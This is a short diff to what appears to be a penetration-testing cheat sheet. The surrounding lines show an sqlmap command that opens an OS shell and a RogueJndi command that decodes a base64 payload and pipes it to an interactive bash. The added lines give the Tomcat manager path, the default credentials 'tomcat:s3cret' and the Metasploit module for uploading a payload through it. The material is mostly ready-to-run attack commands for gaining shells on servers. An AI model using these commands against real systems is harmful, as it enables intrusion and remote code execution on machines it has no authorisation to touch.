@@ -181,6 +181,14 @@ $ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
 $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
 ```
 
+- Tomcat
+
+```
+http://<IP address>:<port>/manager/html
+tomcat:s3cret
+use exploit/multi/http/tomcat_mgr_upload
+```
+
 #3. - Lateral Movement
 -----------------------------------------
 
